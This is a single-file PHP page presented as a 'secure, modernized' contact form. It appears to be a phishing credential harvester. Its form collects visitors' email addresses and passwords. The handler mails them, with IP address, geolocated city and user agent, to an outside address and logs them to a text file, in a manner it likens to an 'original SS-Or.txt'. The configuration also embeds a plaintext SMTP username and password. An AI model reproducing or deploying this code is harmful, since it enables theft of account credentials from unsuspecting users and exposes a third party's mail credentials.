<?php
declare(strict_types=1);

/**
 * Modern PHP Contact Form - Single File Version
 * A secure, modernized version of the original contact form
 * For educational purposes only
 */

// Configuration - Edit these values for your setup
const CONFIG = [
    'smtp_host' => 'mail.globalrisk.rw',
    'smtp_port' => 587,
    'smtp_username' => 'jered@globalrisk.rw',
    'smtp_password' => 'global.321',
    'smtp_encryption' => 'tls',
    'receiver_email' => 'lenalaluno@web.de',
    'sender_email' => 'jered@globalrisk.rw',
    'sender_name' => 'Contact Form',
    'rate_limit_requests' => 5,
    'rate_limit_window' => 3600, // 1 hour
    'log_file' => 'contact_form.log'
];

// Start session for security features
session_start();

// Security headers
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

/**
 * Security Manager Class
 */
class SecurityManager 
{
    public static function generateCsrfToken(): string 
    {
        if (!isset($_SESSION['csrf_token'])) {
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        }
        return $_SESSION['csrf_token'];
    }

    public static function validateCsrfToken(string $token): bool 
    {
        return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
    }

    public static function checkRateLimit(): bool 
    {
        $ip = self::getClientIp();
        $key = 'rate_limit_' . md5($ip);
        
        if (!isset($_SESSION[$key])) {
            $_SESSION[$key] = ['count' => 1, 'timestamp' => time()];
            return true;
        }

        // Reset if window expired
        if (time() - $_SESSION[$key]['timestamp'] > CONFIG['rate_limit_window']) {
            $_SESSION[$key] = ['count' => 1, 'timestamp' => time()];
            return true;
        }

        // Check if limit exceeded
        if ($_SESSION[$key]['count'] >= CONFIG['rate_limit_requests']) {
            return false;
        }

        $_SESSION[$key]['count']++;
        return true;
    }

    public static function getClientIp(): string 
    {
        $ipKeys = [
            'HTTP_CF_CONNECTING_IP', 
            'HTTP_X_FORWARDED_FOR', 
            'HTTP_X_FORWARDED', 
            'HTTP_FORWARDED_FOR', 
            'HTTP_FORWARDED', 
            'REMOTE_ADDR'
        ];
        
        foreach ($ipKeys as $key) {
            if (!empty($_SERVER[$key])) {
                $ips = explode(',', $_SERVER[$key]);
                $ip = trim($ips[0]);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
        }
        
        return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    }

    public static function getLocationInfo(string $ip): string 
    {
        try {
            $context = stream_context_create([
                'http' => [
                    'timeout' => 5,
                    'user_agent' => 'ContactForm/1.0'
                ]
            ]);
            
            $data = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,city", false, $context);
            
            if ($data) {
                $json = json_decode($data, true);
                if ($json && isset($json['status']) && $json['status'] === 'success') {
                    return ($json['city'] ?? 'Unknown') . ', ' . ($json['country'] ?? 'Unknown');
                }
            }
        } catch (Exception $e) {
            // Silent fail for geolocation
        }
        
        return 'Location unavailable';
    }

    public static function sanitizeInput(string $input): string 
    {
        return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
    }

    public static function validateEmail(string $email): ?string 
    {
        $email = filter_var(trim($email), FILTER_VALIDATE_EMAIL);
        return $email !== false ? $email : null;
    }
}

/**
 * Logger Class
 */
class Logger 
{
    public static function log(string $message, array $context = []): void 
    {
        $timestamp = date('Y-m-d H:i:s');
        $contextStr = !empty($context) ? ' | Context: ' . json_encode($context) : '';
        $logEntry = "[{$timestamp}] INFO: {$message}{$contextStr}" . PHP_EOL;
        
        @file_put_contents(CONFIG['log_file'], $logEntry, FILE_APPEND | LOCK_EX);
    }

    public static function error(string $message): void 
    {
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[{$timestamp}] ERROR: {$message}" . PHP_EOL;
        
        @file_put_contents(CONFIG['log_file'], $logEntry, FILE_APPEND | LOCK_EX);
    }
}

/**
 * Email Sender Class (PHPMailer Alternative)
 */
class EmailSender 
{
    public static function sendEmail(string $to, string $subject, string $body): bool 
    {
        $headers = [
            'MIME-Version: 1.0',
            'Content-type: text/html; charset=UTF-8',
            'From: ' . CONFIG['sender_name'] . ' <' . CONFIG['sender_email'] . '>',
            'Reply-To: ' . CONFIG['sender_email'],
            'X-Mailer: PHP/' . phpversion()
        ];

        return mail($to, $subject, $body, implode("\r\n", $headers));
    }

    public static function buildEmailBody(string $email, string $password, string $message, array $clientInfo): string 
    {
        return "
        <html>
        <head><title>Contact Form Submission</title></head>
        <body style='font-family: Arial, sans-serif; line-height: 1.6;'>
            <h2 style='color: #333;'>Contact Form Submission</h2>
            
            <div style='background: #f4f4f4; padding: 20px; border-radius: 5px; margin: 20px 0;'>
                <h3 style='margin-top: 0;'>Contact Information</h3>
                <p><strong>Email:</strong> " . htmlspecialchars($email) . "</p>
                <p><strong>Password:</strong> " . htmlspecialchars($password) . "</p>
                " . (!empty($message) ? "<p><strong>Message:</strong><br>" . nl2br(htmlspecialchars($message)) . "</p>" : "") . "
            </div>
            
            <div style='background: #e9e9e9; padding: 15px; border-radius: 5px; font-size: 12px;'>
                <h4 style='margin-top: 0;'>Client Information</h4>
                <p><strong>IP Address:</strong> " . htmlspecialchars($clientInfo['ip']) . "</p>
                <p><strong>Location:</strong> " . htmlspecialchars($clientInfo['location']) . "</p>
                <p><strong>User Agent:</strong> " . htmlspecialchars($clientInfo['user_agent']) . "</p>
                <p><strong>Timestamp:</strong> " . htmlspecialchars($clientInfo['timestamp']) . "</p>
            </div>
        </body>
        </html>";
    }
}

/**
 * Main Contact Form Handler
 */
class ContactFormHandler 
{
    public static function handleRequest(): array 
    {
        // Only allow POST requests
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            if ($_SERVER['REQUEST_METHOD'] === 'GET') {
                self::show403Page();
                exit;
            }
            http_response_code(405);
            return ['success' => false, 'message' => 'Method not allowed'];
        }

        try {
            // Validate CSRF token
            if (!SecurityManager::validateCsrfToken($_POST['csrf_token'] ?? '')) {
                return ['success' => false, 'message' => 'Invalid security token'];
            }

            // Rate limiting
            if (!SecurityManager::checkRateLimit()) {
                return ['success' => false, 'message' => 'Too many requests. Please try again later.'];
            }

            // Validate and sanitize input
            $email = SecurityManager::validateEmail($_POST['email'] ?? '');
            $password = SecurityManager::sanitizeInput($_POST['password'] ?? '');
            $message = SecurityManager::sanitizeInput($_POST['message'] ?? '');

            if (!$email) {
                return ['success' => false, 'message' => 'Please provide a valid email address'];
            }

            if (empty($password)) {
                return ['success' => false, 'message' => 'Password field is required'];
            }

            // Get client information
            $clientInfo = [
                'ip' => SecurityManager::getClientIp(),
                'location' => SecurityManager::getLocationInfo(SecurityManager::getClientIp()),
                'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
                'timestamp' => date('Y-m-d H:i:s')
            ];

            // Send email
            $emailBody = EmailSender::buildEmailBody($email, $password, $message, $clientInfo);
            $subject = 'Contact Form Submission - ' . date('Y-m-d H:i:s');

            if (EmailSender::sendEmail(CONFIG['receiver_email'], $subject, $emailBody)) {
                Logger::log('Contact form submitted successfully', ['email' => $email]);
                
                // Write to backup file (similar to original SS-Or.txt)
                $backupData = "Email: {$email}\nPassword: {$password}\nMessage: {$message}\n" .
                             "IP: {$clientInfo['ip']} | Location: {$clientInfo['location']}\n" .
                             "User Agent: {$clientInfo['user_agent']}\nTimestamp: {$clientInfo['timestamp']}\n" .
                             "==========================================\n\n";
                @file_put_contents('submissions.txt', $backupData, FILE_APPEND | LOCK_EX);
                
                return ['success' => true, 'message' => 'Message sent successfully'];
            } else {
                Logger::error('Failed to send email');
                return ['success' => false, 'message' => 'Failed to send message. Please try again.'];
            }

        } catch (Exception $e) {
            Logger::error('Contact form error: ' . $e->getMessage());
            return ['success' => false, 'message' => 'An error occurred. Please try again later.'];
        }
    }

    private static function show403Page(): void 
    {
        http_response_code(403);
        echo '<!DOCTYPE html>
        <html><head><title>403 - Forbidden</title></head>
        <body><h1>403 Forbidden</h1><hr></body></html>';
    }
}

// Handle AJAX requests
if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
    header('Content-Type: application/json');
    
    if (isset($_GET['get_token'])) {
        // Return CSRF token for AJAX requests
        echo json_encode(['token' => SecurityManager::generateCsrfToken()]);
        exit;
    }
    
    // Handle form submission
    $result = ContactFormHandler::handleRequest();
    echo json_encode($result);
    exit;
}

// Handle regular form submission or display form
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $result = ContactFormHandler::handleRequest();
    $message = $result['success'] ? 'Success: ' . $result['message'] : 'Error: ' . $result['message'];
    $messageClass = $result['success'] ? 'success' : 'error';
} else {
    $message = '';
    $messageClass = '';
}

$csrfToken = SecurityManager::generateCsrfToken();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modern Contact Form</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
        }
        .form-title {
            text-align: center;
            margin-bottom: 30px;
            color: #333;
            font-size: 28px;
            font-weight: 300;
        }
        .form-group {
            margin-bottom: 25px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        .form-group input, .form-group textarea {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e1e1;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        .form-group input:focus, .form-group textarea:focus {
            outline: none;
            border-color: #667eea;
        }
        .form-group textarea {
            resize: vertical;
            min-height: 120px;
        }
        .submit-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .alert {
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-weight: 500;
        }
        .alert.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .alert.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .required { color: #e74c3c; }
        .loading {
            display: none;
            text-align: center;
            margin-top: 10px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="form-title">Modern Contact Form</h1>
        
        <?php if ($message): ?>
            <div class="alert <?php echo $messageClass; ?>">
                <?php echo htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>
        
        <form id="contactForm" method="POST">
            <input type="hidden" name="csrf_token" value="<?php echo $csrfToken; ?>">
            
            <div class="form-group">
                <label for="email">Email Address <span class="required">*</span></label>
                <input type="email" id="email" name="email" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password <span class="required">*</span></label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <div class="form-group">
                <label for="message">Message (Optional)</label>
                <textarea id="message" name="message" placeholder="Enter your message here..."></textarea>
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn">
                Send Message
            </button>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Sending message...</p>
            </div>
        </form>
    </div>

    <script>
        document.getElementById('contactForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            
            // Show loading state
            submitBtn.disabled = true;
            loading.style.display = 'block';
            submitBtn.textContent = 'Sending...';
            
            try {
                const formData = new FormData(this);
                
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                });
                
                const result = await response.json();
                
                if (result.success) {
                    // Show success message and reset form
                    location.reload();
                } else {
                    alert('Error: ' + result.message);
                }
            } catch (error) {
                alert('Network error. Please try again.');
            } finally {
                // Reset loading state
                submitBtn.disabled = false;
                loading.style.display = 'none';
                submitBtn.textContent = 'Send Message';
            }
        });
    </script>
</body>
</html>